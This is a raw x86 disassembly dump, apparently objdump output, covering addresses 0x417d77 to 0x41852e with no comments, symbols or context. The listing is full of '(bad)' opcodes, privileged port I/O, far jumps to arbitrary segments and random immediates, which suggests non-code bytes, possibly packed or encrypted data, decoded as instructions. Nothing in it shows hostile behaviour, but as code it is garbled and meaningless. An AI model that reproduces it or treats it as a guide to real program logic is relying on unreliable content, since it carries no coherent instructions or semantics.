  417d77:	shl    DWORD PTR [ebx],cl
  417d79:	pop    ebx
  417d7a:	int3   
  417d7b:	push   es
  417d7c:	int    0x29
  417d7e:	pusha  
  417d7f:	sbb    bl,BYTE PTR [esi]
  417d81:	jmp    0xc085:0x1622467a
  417d88:	cld    
  417d89:	sbb    eax,0x7ac546f4
  417d8e:	jg     0x417dda
  417d90:	push   edx
  417d91:	pop    ds
  417d92:	xchg   ebp,eax
  417d93:	fsubp  st(7),st
  417d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d96:	or     BYTE PTR [ecx+0x3f],0x41
  417d9a:	sbb    ebp,0x2b
  417d9d:	add    al,0x52
  417d9f:	test   DWORD PTR [esi-0x6de6574b],0x2468be23
  417da9:	clc    
  417daa:	out    0xaf,al
  417dac:	add    BYTE PTR [ebx+ecx*8+0x12],dl
  417db0:	in     al,0x39
  417db2:	push   ebp
  417db3:	aas    
  417db4:	add    ecx,ebp
  417db6:	call   0x5f4a:0x90b7dc84
  417dbd:	jecxz  0x417e26
  417dbf:	cli    
  417dc0:	das    
  417dc1:	sub    eax,0x92019560
  417dc6:	pop    ecx
  417dc7:	in     al,dx
  417dc8:	(bad)  
  417dc9:	jnp    0x417d4e
  417dcb:	adc    edx,esp
  417dcd:	mov    ebx,0xd63a7d50
  417dd2:	jnp    0x417e45
  417dd4:	adc    ah,BYTE PTR [ebx]
  417dd6:	xor    dl,BYTE PTR [ecx]
  417dd8:	test   ecx,esi
  417dda:	daa    
  417ddb:	xchg   edi,eax
  417ddc:	jp     0x417e0b
  417dde:	fsubr  st,st(5)
  417de0:	xor    eax,0x15379311
  417de5:	lahf   
  417de6:	pop    ebx
  417de7:	loopne 0x417d96
  417de9:	sbb    al,0x96
  417deb:	(bad)  [ebx-0x28]
  417dee:	addr16 push ss
  417df0:	rcr    DWORD PTR [ebp*1+0x77452261],1
  417df7:	pop    edx
  417df8:	pop    edx
  417df9:	pop    esp
  417dfa:	les    edi,FWORD PTR [ecx]
  417dfc:	lds    eax,FWORD PTR [edi]
  417dfe:	mov    ds:0xc8292cd5,eax
  417e03:	mov    cs,WORD PTR [esi+0x75]
  417e06:	and    dl,BYTE PTR [ebp+0x3e73ef]
  417e0c:	fwait
  417e0d:	icebp  
  417e0e:	dec    eax
  417e0f:	nop
  417e10:	cli    
  417e11:	cld    
  417e12:	or     BYTE PTR [ecx-0x6ce03bcb],0x19
  417e19:	sbb    al,0x4f
  417e1b:	mov    edi,ebx
  417e1d:	pop    es
  417e1e:	mov    DWORD PTR [edx-0x28],0xe9c67d80
  417e25:	sub    al,dh
  417e27:	xchg   ecx,eax
  417e28:	xlat   BYTE PTR ds:[ebx]
  417e29:	stc    
  417e2a:	mov    ah,BYTE PTR [edx-0x1e]
  417e2d:	add    al,0x4
  417e2f:	xchg   bx,ax
  417e31:	sahf   
  417e32:	xchg   edx,eax
  417e33:	imul   eax,DWORD PTR [esi-0x7c],0x32
  417e37:	xchg   edi,eax
  417e38:	test   BYTE PTR [edi+edi*1],ah
  417e3b:	inc    ebx
  417e3c:	and    eax,0x436fb067
  417e41:	lock sbb eax,0xd70c8823
  417e47:	jmp    0x417eae
  417e49:	enter  0xee3c,0x42
  417e4d:	(bad)  
  417e4e:	jmp    0x3780:0xb565c236
  417e55:	push   ebx
  417e56:	mov    ah,0x30
  417e58:	(bad)  
  417e59:	loop   0x417e72
  417e5b:	mov    al,0xf0
  417e5d:	(bad)  
  417e5e:	out    dx,eax
  417e5f:	xor    al,0xb7
  417e61:	add    eax,0x5a78a486
  417e66:	dec    ecx
  417e67:	icebp  
  417e68:	out    dx,eax
  417e69:	inc    esp
  417e6a:	pop    es
  417e6b:	xchg   edx,eax
  417e6c:	or     BYTE PTR ds:0x790ba840,dl
  417e72:	lods   al,BYTE PTR ds:[esi]
  417e73:	jnp    0x417ec2
  417e75:	out    0x67,al
  417e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e78:	add    BYTE PTR [eax],al
  417e7a:	mov    cl,0x78
  417e7c:	sub    eax,0x9142374d
  417e81:	add    ebp,edx
  417e83:	shl    BYTE PTR ds:0xc8a38d8e,0x2f
  417e8a:	xor    eax,DWORD PTR [esp+ebx*1+0x11]
  417e8e:	adc    BYTE PTR [eax+ecx*1+0x49],ah
  417e92:	rcl    BYTE PTR [ebp-0x1765fe79],1
  417e98:	mov    ds:0xab7c44d5,eax
  417e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e9e:	mov    eax,0x1cc08322
  417ea3:	mov    ?,ebp
  417ea5:	outs   dx,BYTE PTR ds:[esi]
  417ea6:	adc    DWORD PTR [ebx-0x6a108f5c],ebp
  417eac:	loop   0x417e4c
  417eae:	mov    ah,0xcb
  417eb0:	xor    DWORD PTR [ecx+0x4e],eax
  417eb3:	xchg   esi,eax
  417eb4:	mov    al,ds:0x9e82cbc7
  417eb9:	push   ebp
  417eba:	scas   eax,DWORD PTR es:[edi]
  417ebb:	xor    al,0xe0
  417ebd:	jge    0x417f3d
  417ebf:	xchg   BYTE PTR [esi+0x64471317],ch
  417ec5:	cmp    eax,0x4fa09c3a
  417eca:	xchg   DWORD PTR [edx],esp
  417ecc:	sub    ch,BYTE PTR [ecx*2-0x2c4c2675]
  417ed3:	ret    0x2977
  417ed6:	jo     0x417f24
  417ed8:	cmp    al,0x54
  417eda:	mov    BYTE PTR [edi],dl
  417edc:	out    0xc2,al
  417ede:	mov    ch,0x3b
  417ee0:	dec    edx
  417ee1:	int3   
  417ee2:	inc    esi
  417ee3:	mov    al,0x91
  417ee5:	fiadd  WORD PTR [ecx+eiz*2]
  417ee8:	sub    cl,BYTE PTR [ecx]
  417eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eeb:	add    edi,DWORD PTR [ebx+0x1f]
  417eee:	push   esp
  417eef:	popf   
  417ef0:	jle    0x417ebd
  417ef2:	sbb    al,BYTE PTR [esi-0x21]
  417ef5:	or     eax,0x4da167a0
  417efa:	cmp    ah,cl
  417efc:	or     edx,DWORD PTR [esi-0x39bd8955]
  417f02:	jns    0x417eab
  417f04:	shl    BYTE PTR [ebx+0x5b],1
  417f07:	jl     0x417ed0
  417f09:	fs pop ecx
  417f0b:	add    eax,0x46a4307f
  417f10:	dec    eax
  417f11:	push   es
  417f12:	sbb    DWORD PTR [ecx+edx*1-0x21],eax
  417f16:	test   al,0x6e
  417f18:	fdivr  DWORD PTR [ecx+0x464b411d]
  417f1e:	cdq    
  417f1f:	pushf  
  417f20:	pop    esi
  417f21:	push   eax
  417f22:	retf   
  417f23:	sub    BYTE PTR [ecx],0x34
  417f26:	inc    edi
  417f27:	xlat   BYTE PTR es:[ebx]
  417f29:	enter  0x2926,0xe6
  417f2d:	xor    DWORD PTR [eax+0x3682db91],ebp
  417f33:	hlt    
  417f34:	in     al,0x2f
  417f36:	add    esp,DWORD PTR [eax]
  417f38:	dec    edi
  417f39:	pop    eax
  417f3a:	sub    DWORD PTR [ecx-0x3f13b46d],esp
  417f40:	xchg   edi,eax
  417f41:	(bad)  
  417f42:	xor    eax,0x772432ff
  417f47:	dec    edx
  417f48:	dec    eax
  417f49:	(bad)  
  417f4a:	cmp    BYTE PTR [eax+0x42],dh
  417f4d:	mov    dh,0x8
  417f4f:	jne    0x417fa2
  417f51:	pop    ss
  417f52:	xchg   ebp,eax
  417f53:	idiv   ch
  417f55:	cmc    
  417f56:	sbb    BYTE PTR [edx],cl
  417f58:	mov    edx,0xe61fd5c7
  417f5d:	stc    
  417f5e:	lods   al,BYTE PTR cs:[esi]
  417f60:	out    0x73,eax
  417f62:	dec    esp
  417f63:	add    eax,0x708e0edb
  417f68:	and    eax,0xa17c36ec
  417f6d:	lds    ecx,FWORD PTR [eax-0x2c]
  417f70:	jns    0x417f10
  417f72:	add    edi,ebp
  417f74:	pop    ebp
  417f75:	push   ss
  417f76:	xchg   ebp,eax
  417f77:	es out dx,al
  417f79:	mov    bh,0x78
  417f7b:	lods   al,BYTE PTR ds:[esi]
  417f7c:	xor    DWORD PTR [ecx],edx
  417f7e:	lea    edi,[ecx+0x7d408e4b]
  417f84:	xchg   ebx,eax
  417f85:	in     al,dx
  417f86:	aaa    
  417f87:	push   esp
  417f88:	pop    edx
  417f89:	sbb    ebx,DWORD PTR [ecx]
  417f8b:	fistp  QWORD PTR [ebp-0xe1a9db2]
  417f91:	xchg   DWORD PTR [ebp-0x3ca52705],edx
  417f97:	dec    esp
  417f98:	(bad)  
  417f99:	fmul   QWORD PTR [edi-0x3e]
  417f9c:	stos   BYTE PTR es:[edi],al
  417f9d:	inc    esi
  417f9e:	push   edx
  417f9f:	mov    ah,0x4a
  417fa1:	add    BYTE PTR [edx-0x22],bl
  417fa4:	adc    esi,ecx
  417fa6:	inc    edi
  417fa7:	xchg   edi,eax
  417fa8:	sar    ebx,1
  417faa:	sub    al,0x26
  417fac:	rcr    DWORD PTR [ebx],cl
  417fae:	pmaxsw mm4,QWORD PTR [eax+0x38]
  417fb2:	icebp  
  417fb3:	les    eax,FWORD PTR [ecx]
  417fb5:	cld    
  417fb6:	inc    edx
  417fb7:	push   edi
  417fb8:	lock jne 0x417f8f
  417fbb:	sbb    edx,DWORD PTR ds:0xdf5c06db
  417fc1:	sti    
  417fc2:	aaa    
  417fc3:	pop    edi
  417fc4:	inc    esi
  417fc5:	aam    0x6f
  417fc7:	or     BYTE PTR ds:0xa63020b3,0xf8
  417fce:	hlt    
  417fcf:	inc    ebp
  417fd0:	xor    eax,0xffffff8a
  417fd3:	movzx  ecx,cx
  417fd6:	mov    al,0x39
  417fd8:	ss jecxz 0x418040
  417fdb:	xlat   BYTE PTR ds:[ebx]
  417fdc:	jnp    0x418001
  417fde:	push   es
  417fdf:	inc    edx
  417fe0:	sbb    al,0xae
  417fe2:	data16 sbb al,0xba
  417fe5:	pop    ecx
  417fe6:	add    DWORD PTR [ecx],edx
  417fe8:	push   cs
  417fe9:	lea    edx,[eax+0x36]
  417fec:	sbb    DWORD PTR [ecx-0x2e],0x21ecb721
  417ff3:	and    bl,BYTE PTR [eax+edx*4]
  417ff6:	xchg   DWORD PTR [ecx-0x6d],ebp
  417ff9:	jle    0x418005
  417ffb:	pop    ds
  417ffc:	loopne 0x418003
  417ffe:	ins    BYTE PTR es:[edi],dx
  417fff:	mov    bh,0xd2
  418001:	mov    cl,0xb8
  418003:	call   0x6cb:0xd350bf26
  41800a:	es push ebx
  41800c:	dec    ebp
  41800d:	mov    ch,0xef
  41800f:	cmp    dh,cl
  418011:	lahf   
  418012:	jbe    0x418054
  418014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418015:	mov    ch,0xee
  418018:	inc    esp
  418019:	sar    esi,0x6c
  41801c:	mov    ds:0x56b64148,eax
  418021:	adc    al,0x2b
  418023:	clc    
  418024:	in     eax,0xc
  418026:	push   cs
  418027:	mov    esp,0xce4f53f0
  41802c:	ret    0xcb23
  41802f:	std    
  418030:	and    DWORD PTR [edx],esp
  418032:	repnz adc DWORD PTR [eax-0x2c],edi
  418036:	frstor [ecx+0x2038e475]
  41803c:	outs   dx,BYTE PTR ds:[esi]
  41803d:	mov    ecx,0x9440494e
  418042:	mov    edi,0xe79a2eb8
  418047:	mov    ebp,DWORD PTR [esi]
  418049:	out    0xc,eax
  41804b:	ror    BYTE PTR [edx],1
  41804d:	push   eax
  41804e:	mov    al,ds:0xe1b8a4fe
  418053:	adc    eax,0x935632e7
  418058:	or     eax,0xd95dba44
  41805d:	rcl    DWORD PTR ds:0xc5cb09f1,0xf0
  418064:	ret    
  418065:	push   eax
  418066:	push   ds
  418067:	push   esi
  418068:	dec    ebx
  418069:	mov    eax,ds:0x97b50a4
  41806e:	outs   dx,BYTE PTR ds:[esi]
  41806f:	and    dl,BYTE PTR [esi+eax*2]
  418072:	dec    ebx
  418073:	mov    bl,0x39
  418075:	sbb    dh,BYTE PTR [eax]
  418077:	retf   0x7dde
  41807a:	pop    ebp
  41807b:	push   0x1d
  41807d:	and    eax,0xdd75070b
  418082:	popa   
  418083:	mov    ecx,0x87c2437c
  418088:	pop    edi
  418089:	inc    esi
  41808a:	lahf   
  41808b:	ds mov edx,0x431553a0
  418091:	jl     0x4180f3
  418093:	loope  0x41809b
  418095:	jb     0x41804e
  418097:	jne    0x4180b2
  418099:	nop
  41809a:	pop    ebp
  41809b:	je     0x41806a
  41809d:	xor    eax,esp
  41809f:	out    dx,al
  4180a0:	dec    ebx
  4180a1:	aas    
  4180a2:	into   
  4180a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a4:	jnp    0x418041
  4180a6:	ror    DWORD PTR [esi-0x56b038f7],1
  4180ac:	and    al,0x50
  4180ae:	mov    dl,0xb
  4180b0:	mov    dh,0x3d
  4180b2:	in     eax,0x2
  4180b4:	mov    ds:0x3253863c,al
  4180b9:	adc    bl,BYTE PTR [ecx+0x2b]
  4180bc:	sbb    al,BYTE PTR [edx+eiz*4+0x52]
  4180c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180c1:	dec    esi
  4180c2:	dec    edi
  4180c3:	jbe    0x4180c5
  4180c5:	sub    BYTE PTR [ecx+0x2c],0x1c
  4180c9:	ins    BYTE PTR es:[edi],dx
  4180ca:	out    dx,eax
  4180cb:	out    dx,al
  4180cc:	push   0x68
  4180ce:	jecxz  0x418069
  4180d0:	scas   eax,DWORD PTR es:[edi]
  4180d1:	xchg   ebx,eax
  4180d2:	cld    
  4180d3:	push   ds
  4180d4:	jecxz  0x418149
  4180d6:	ret    
  4180d7:	test   DWORD PTR [ecx+0x56],edx
  4180da:	lds    eax,FWORD PTR [edi+0x3c]
  4180dd:	sbb    eax,0x2bc1ea09
  4180e2:	test   al,0xf1
  4180e4:	or     ebx,ecx
  4180e6:	or     al,0x44
  4180e8:	in     al,dx
  4180e9:	lods   eax,DWORD PTR ds:[esi]
  4180ea:	xchg   BYTE PTR [ebp+0x6fe803c0],cl
  4180f0:	loope  0x41809a
  4180f2:	fcom   st(4)
  4180f4:	push   edx
  4180f5:	sub    DWORD PTR [ebp-0x26],edi
  4180f8:	push   cs
  4180f9:	push   ecx
  4180fa:	pushf  
  4180fb:	sbb    DWORD PTR [eax-0x4d281305],0x66
  418102:	lock push esp
  418104:	adc    esi,DWORD PTR [ebp-0x3fbaa3aa]
  41810a:	bound  edx,QWORD PTR [ebx-0x7b]
  41810d:	in     al,dx
  41810e:	es dec esi
  418110:	jl     0x41809c
  418112:	adc    esp,DWORD PTR [esi+edi*8]
  418115:	out    dx,al
  418116:	jg     0x418139
  418118:	mov    al,ds:0x33911ba5
  41811d:	add    BYTE PTR [ebx],dl
  41811f:	adc    ch,BYTE PTR [ebx+0x5a]
  418122:	cmp    cl,bl
  418124:	xor    al,0x8d
  418126:	inc    eax
  418127:	loope  0x418160
  418129:	mov    al,0xf0
  41812b:	or     eax,0x1007dede
  418130:	ror    BYTE PTR [edx],0x1d
  418133:	sbb    DWORD PTR [esi],0xf6419bb2
  418139:	pop    es
  41813a:	and    bh,BYTE PTR [ecx+0x5e23cdbe]
  418140:	cmp    ecx,edx
  418142:	outs   dx,DWORD PTR ds:[esi]
  418143:	mov    ah,0xbb
  418145:	ror    BYTE PTR [edx-0x40191647],cl
  41814b:	and    al,BYTE PTR ss:[esi+0x40fe10f7]
  418152:	pushf  
  418153:	cmp    bl,BYTE PTR [ebx-0x28]
  418156:	cmc    
  418157:	sub    al,0x39
  418159:	push   0x33
  41815b:	mov    al,0xa7
  41815d:	call   0xe18b5a6
  418162:	xor    BYTE PTR [edx+0x3a],bh
  418165:	add    eax,0xacaa712f
  41816a:	lahf   
  41816b:	ins    DWORD PTR es:[edi],dx
  41816c:	mov    ch,0xe8
  41816e:	or     al,0xd6
  418170:	pop    edx
  418171:	daa    
  418172:	mov    cl,0x74
  418174:	jae    0x418143
  418176:	(bad)  
  418177:	push   ecx
  418178:	mov    ds:0xd746503a,eax
  41817d:	xchg   edx,esi
  41817f:	repz fisub WORD PTR [edx]
  418182:	cdq    
  418183:	inc    esi
  418184:	out    0x15,eax
  418186:	and    dh,BYTE PTR [edi+0x2b34c87c]
  41818c:	ret    0xaec5
  41818f:	sbb    DWORD PTR [ecx],ecx
  418191:	loope  0x4181c1
  418193:	mov    bh,0xc5
  418195:	inc    ebp
  418196:	add    bh,dl
  418198:	aaa    
  418199:	mov    DWORD PTR [esi],0xa70ee1ae
  41819f:	and    ebx,DWORD PTR [ebx-0x2dc5e599]
  4181a5:	ror    DWORD PTR [ebx],cl
  4181a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181a8:	ret    0x18c
  4181ab:	pop    esi
  4181ac:	pop    esi
  4181ad:	mov    edi,0xc27606da
  4181b2:	cdq    
  4181b3:	into   
  4181b4:	rol    DWORD PTR [ebx],0xee
  4181b7:	(bad)  
  4181b8:	jbe    0x418239
  4181ba:	xchg   ebp,edi
  4181bc:	mov    ebp,0x1c505cb1
  4181c1:	add    DWORD PTR [edi-0x72],ecx
  4181c4:	push   esi
  4181c5:	fs cmc 
  4181c7:	repz adc BYTE PTR [ecx+edi*1],dh
  4181cb:	fidivr WORD PTR [ecx-0x1d]
  4181ce:	xchg   ecx,eax
  4181cf:	sub    cl,cl
  4181d1:	das    
  4181d2:	(bad)  
  4181d3:	sbb    eax,DWORD PTR [ecx+ecx*4+0x1e]
  4181d7:	clc    
  4181d8:	mov    eax,DWORD PTR ds:0xb9c15cf5
  4181de:	(bad)  [esi-0x3d]
  4181e1:	and    BYTE PTR [esi+ebp*8+0x24d03d67],dl
  4181e8:	jg     0x418189
  4181ea:	stos   BYTE PTR es:[edi],al
  4181eb:	icebp  
  4181ec:	fwait
  4181ed:	xchg   edx,eax
  4181ee:	mov    esi,0x4e24fb09
  4181f3:	adc    bl,BYTE PTR [eax+0x3e]
  4181f6:	and    dl,BYTE PTR [edi+0x65290c27]
  4181fc:	push   edi
  4181fd:	daa    
  4181fe:	xchg   ebp,eax
  4181ff:	fnstenv [edx]
  418201:	add    al,0x6b
  418203:	xor    al,BYTE PTR [ebx]
  418205:	push   ebp
  418206:	mov    ecx,0xf5fc4d6b
  41820b:	rol    BYTE PTR [edx-0x4b7156fe],cl
  418211:	mov    bh,0x63
  418213:	push   edx
  418214:	lds    esp,FWORD PTR [ebp+0x6691c989]
  41821a:	cmp    DWORD PTR ds:0xad70e954,edx
  418220:	jns    0x41829a
  418222:	or     al,0x8e
  418224:	mov    ds:0xf0d67c73,al
  418229:	fistp  QWORD PTR [ebp+0x438b15e2]
  41822f:	mov    ?,WORD PTR [edx]
  418231:	mov    bh,0x40
  418233:	icebp  
  418234:	inc    edi
  418235:	stc    
  418236:	xchg   esp,eax
  418237:	mov    edx,0x2f77f440
  41823c:	neg    BYTE PTR [edx-0x74]
  41823f:	mov    ch,0x6f
  418241:	inc    esp
  418242:	retf   
  418243:	fpatan 
  418245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418246:	cli    
  418247:	ja     0x418286
  418249:	sbb    BYTE PTR [ebp-0x11facb9d],bh
  41824f:	push   ss
  418250:	pop    ebx
  418251:	or     al,0x69
  418253:	xor    eax,DWORD PTR [ebx-0x58]
  418256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418257:	jle    0x41820f
  418259:	stc    
  41825a:	sub    BYTE PTR [ebp+0x3a96359a],0x82
  418261:	jp     0x4182a6
  418263:	mov    bl,0x99
  418265:	sub    DWORD PTR [edx-0x53],ecx
  418268:	adc    BYTE PTR [edi-0x68],0xb0
  41826c:	inc    ebp
  41826e:	mov    esi,0xe63b5102
  418273:	mov    bh,0x5
  418275:	aam    0x8
  418277:	ret    0xfdee
  41827a:	jb     0x418217
  41827c:	mov    es,WORD PTR [edi+0x7f]
  41827f:	(bad)  
  418281:	push   ebp
  418282:	iret   
  418283:	div    dh
  418285:	cmp    dl,BYTE PTR [ebp-0x4db0ba0f]
  41828b:	push   0xfffffffb
  41828d:	jno    0x418256
  41828f:	into   
  418290:	jmp    0x57415c0d
  418295:	lock retf 0xd6db
  418299:	bound  esp,QWORD PTR [ebp-0x6a]
  41829c:	jb     0x4182f3
  41829e:	mov    edi,0x1144894d
  4182a3:	leave  
  4182a4:	pop    ebx
  4182a5:	cmp    ah,dh
  4182a7:	pop    esp
  4182a8:	mov    cl,0xd6
  4182aa:	jne    0x418309
  4182ac:	leave  
  4182ad:	inc    ebp
  4182ae:	sub    dh,BYTE PTR [ecx+0x1b]
  4182b1:	mov    BYTE PTR [ebx-0x2f6ef68c],bh
  4182b7:	mov    bl,0x99
  4182b9:	sub    eax,0x9003af91
  4182be:	cmp    esi,DWORD PTR cs:[eax]
  4182c1:	inc    esp
  4182c2:	jp     0x41830c
  4182c4:	dec    ebp
  4182c5:	imul   esp,DWORD PTR [ebp+ebx*4-0x25],0xffffffc7
  4182ca:	xchg   BYTE PTR [edi],dh
  4182cc:	and    al,BYTE PTR [edx]
  4182ce:	push   es
  4182cf:	jo     0x41833f
  4182d1:	mov    ebx,0x4499005d
  4182d6:	mov    esi,ds
  4182d8:	pop    esp
  4182d9:	cs das 
  4182db:	or     DWORD PTR [ecx],eax
  4182dd:	jb     0x418288
  4182df:	pop    ds
  4182e0:	cmp    bl,dh
  4182e2:	lahf   
  4182e3:	cmp    DWORD PTR [eax],esp
  4182e5:	sub    BYTE PTR ds:0xed1133f8,dh
  4182eb:	fstp   DWORD PTR [eax+0x28676f72]
  4182f1:	(bad)  
  4182f2:	fistp  QWORD PTR [edx+0x5888a330]
  4182f8:	sbb    bh,al
  4182fa:	mov    edi,0x65ddf3e4
  4182ff:	rcl    BYTE PTR [esp+edi*4-0x42],1
  418303:	cmp    eax,0xa76bf89c
  418308:	sub    DWORD PTR [ebx-0x68afa909],esp
  41830e:	jge    0x4182a0
  418310:	popf   
  418311:	jb     0x418305
  418313:	jno    0x41835e
  418315:	mov    DWORD PTR [ebx],0xce13c86a
  41831b:	aaa    
  41831c:	ret    0x1f7a
  41831f:	jbe    0x41838a
  418321:	dec    edx
  418322:	sbb    DWORD PTR [edx+0x550c6553],edi
  418328:	jmp    0xba92:0xdb867ee9
  41832f:	ins    DWORD PTR es:[edi],dx
  418330:	sbb    esi,DWORD PTR [eax+0x6cda5744]
  418336:	ret    
  418337:	ret    
  418338:	fiadd  WORD PTR [eax+0xefe55aa]
  41833e:	push   ss
  41833f:	mov    al,0xa9
  418341:	inc    ebx
  418342:	pushf  
  418343:	xchg   edx,eax
  418344:	cmp    DWORD PTR [ecx+eax*8],eax
  418347:	pop    edi
  418348:	addr16 push ecx
  41834a:	sub    eax,0x6dd3c8d0
  41834f:	(bad)  
  418350:	test   al,0xf6
  418352:	into   
  418353:	stos   BYTE PTR es:[edi],al
  418354:	push   cs
  418355:	rcr    BYTE PTR [eax],0xd1
  418358:	push   cs
  418359:	jl     0x4183b6
  41835b:	mov    ds:0x61aa45e,al
  418360:	mov    eax,DWORD PTR [edx]
  418362:	add    BYTE PTR [edi+edx*1+0x37],ah
  418366:	std    
  418367:	pop    es
  418368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418369:	mov    ah,0xc2
  41836b:	push   ds
  41836c:	fsubr  QWORD PTR [esi]
  41836e:	bound  esi,QWORD PTR [eax]
  418370:	inc    ebp
  418371:	leave  
  418372:	ror    BYTE PTR [ebx+ebp*8],0xaa
  418376:	mov    DWORD PTR [edi],edi
  418378:	dec    esp
  418379:	(bad)  
  41837a:	sub    ebx,DWORD PTR [eax]
  41837c:	les    edx,FWORD PTR [ecx+eiz*4]
  41837f:	mov    eax,ds:0x482c5206
  418384:	or     edi,esi
  418386:	test   al,0xfe
  418388:	mov    ah,0xd7
  41838a:	sbb    dl,BYTE PTR [ebp-0x4c64824e]
  418390:	cli    
  418391:	adc    bl,BYTE PTR [ebp-0xf80d5b2]
  418397:	lock pop ebp
  418399:	or     cl,BYTE PTR ss:[edx+0x759e8154]
  4183a0:	xchg   edi,eax
  4183a1:	xchg   esi,eax
  4183a2:	dec    eax
  4183a3:	(bad)  
  4183a4:	fst    QWORD PTR [edx+0x366ff86]
  4183aa:	and    DWORD PTR [ecx-0x60],0x0
  4183ae:	pop    esp
  4183af:	imul   esi,esi,0x54a1032b
  4183b5:	(bad)  
  4183b6:	sub    ah,BYTE PTR [edi+esi*4-0x679592fa]
  4183bd:	(bad)  
  4183be:	xor    BYTE PTR [ebp-0x59],dh
  4183c1:	mov    eax,ds:0x86ae9bf0
  4183c6:	cmc    
  4183c7:	popa   
  4183c8:	mov    ecx,0x3c182a04
  4183cd:	in     eax,0x4
  4183cf:	lds    esi,FWORD PTR [ebx+ecx*4-0xf72ef9d]
  4183d6:	add    bl,ch
  4183d8:	out    dx,al
  4183d9:	retf   0xfe35
  4183dc:	inc    ecx
  4183dd:	sub    dl,BYTE PTR [ecx+0x4f816067]
  4183e3:	fidiv  DWORD PTR [eax-0x2db93b2a]
  4183e9:	lahf   
  4183ea:	dec    edx
  4183eb:	or     ebx,DWORD PTR [edx+eiz*2]
  4183ee:	sub    eax,0x8db3ccd9
  4183f3:	mov    bh,0xc8
  4183f5:	pop    ecx
  4183f6:	dec    ebx
  4183f7:	sbb    eax,0x40bde4a8
  4183fc:	ja     0x4183b2
  4183fe:	and    dl,0xa7
  418401:	or     al,0x82
  418403:	push   eax
  418404:	sahf   
  418405:	loope  0x418440
  418407:	nop
  418408:	mov    bh,0xd
  41840a:	sub    BYTE PTR [edx+ecx*8+0x53],al
  41840e:	aas    
  41840f:	test   al,0x9a
  418411:	or     al,0x6f
  418413:	push   edi
  418414:	inc    esp
  418415:	mov    dh,0xfd
  418417:	sti    
  418418:	pop    edx
  418419:	ins    BYTE PTR es:[edi],dx
  41841a:	jnp    0x418408
  41841c:	bound  edx,QWORD PTR [eax]
  41841e:	sbb    al,0x25
  418420:	xor    dh,ah
  418422:	cmp    ecx,edx
  418424:	fcomp  st(2)
  418426:	aam    0xe6
  418428:	mov    bh,0x3e
  41842a:	ror    BYTE PTR [ebp-0x7c236e73],cl
  418430:	aaa    
  418431:	xchg   edi,eax
  418432:	pop    edi
  418433:	mov    bl,0x63
  418435:	push   eax
  418436:	ror    DWORD PTR [ebp+0x4e],cl
  418439:	fist   WORD PTR [ebp-0x62e3cb85]
  41843f:	rol    BYTE PTR ds:0x9373c96d,1
  418445:	jno    0x41844a
  418447:	jle    0x418472
  418449:	les    ebp,FWORD PTR [ebp-0x49]
  41844c:	(bad)  
  41844d:	sahf   
  41844e:	(bad)  
  41844f:	popa   
  418450:	xor    eax,0x363d282c
  418455:	inc    esi
  418456:	jle    0x4183ec
  418458:	jne    0x4184ab
  41845a:	mov    al,0x99
  41845c:	xor    dh,ah
  41845e:	aad    0x1b
  418460:	jns    0x4183fd
  418462:	sti    
  418463:	je     0x4183fa
  418465:	(bad)  
  418466:	push   ds
  418467:	pushf  
  418468:	sahf   
  418469:	gs out dx,eax
  41846b:	mov    ebx,DWORD PTR [eax-0x26056313]
  418471:	aam    0x2
  418473:	popf   
  418474:	hlt    
  418475:	call   0x83bfa6be
  41847a:	cwde   
  41847b:	xor    ebx,DWORD PTR [edx+0x33fd86ce]
  418481:	out    0x4b,al
  418483:	and    BYTE PTR [edi-0x1cb1b8f8],cl
  418489:	lea    esp,[edx+0x55]
  41848c:	pop    ebx
  41848d:	pusha  
  41848e:	dec    esi
  41848f:	fistp  WORD PTR [ebp+0x5f]
  418492:	test   al,0x3e
  418494:	xor    eax,0x6e4c2a1c
  418499:	xchg   ecx,eax
  41849a:	daa    
  41849b:	xor    DWORD PTR [edi-0x66],esp
  41849e:	mov    ebp,0x9ef15ae0
  4184a3:	mov    al,ds:0x88ac0bec
  4184a8:	push   esp
  4184a9:	dec    esp
  4184aa:	mov    ebx,0x78ea5fe7
  4184af:	jnp    0x4184da
  4184b1:	add    al,0x67
  4184b3:	push   ss
  4184b4:	ret    
  4184b5:	stos   BYTE PTR es:[edi],al
  4184b6:	lahf   
  4184b7:	sbb    DWORD PTR [esi+0x6ef1bbca],0x36
  4184be:	ret    
  4184bf:	lods   eax,DWORD PTR ds:[esi]
  4184c0:	jl     0x4184e5
  4184c2:	jns    0x289f9ee3
  4184c8:	test   DWORD PTR [esi],0x32f3d964
  4184ce:	dec    bx
  4184d0:	xor    BYTE PTR [eax],cl
  4184d2:	dec    ebx
  4184d3:	in     eax,dx
  4184d4:	sub    ecx,DWORD PTR [ecx+ebp*4+0xa42ae9]
  4184db:	mov    ebp,0x7d7702f8
  4184e0:	mov    bh,0x84
  4184e2:	fisubr DWORD PTR [edi-0x2c1ff7b9]
  4184e8:	xchg   DWORD PTR [edi+edi*1+0x6e0c4cba],ebp
  4184ef:	shl    esi,1
  4184f1:	sar    BYTE PTR [ebx+edx*1+0x59],1
  4184f5:	(bad)  
  4184f6:	lods   al,BYTE PTR ds:[esi]
  4184f7:	es js  0x418482
  4184fa:	sbb    esi,ebx
  4184fc:	adc    ecx,0x76
  4184ff:	(bad)  
  418500:	fisttp QWORD PTR [esi]
  418502:	dec    eax
  418503:	out    dx,eax
  418504:	push   esp
  418505:	sub    eax,0xdb4e9eec
  41850a:	jnp    0x41856d
  41850c:	popf   
  41850d:	je     0x418505
  41850f:	xor    DWORD PTR [ecx],0xe483e072
  418515:	cli    
  418516:	fisubr WORD PTR [ebp+0x3ac9b7f3]
  41851c:	fwait
  41851d:	cld    
  41851e:	inc    edx
  41851f:	jg     0x418502
  418521:	inc    ecx
  418522:	mov    ah,BYTE PTR [edx-0x4b90ec3e]
  418528:	jle    0x41850d
  41852a:	sahf   
  41852b:	xchg   edx,eax
  41852c:	cmp    DWORD PTR [ebx],ebx
  41852e:	cli    
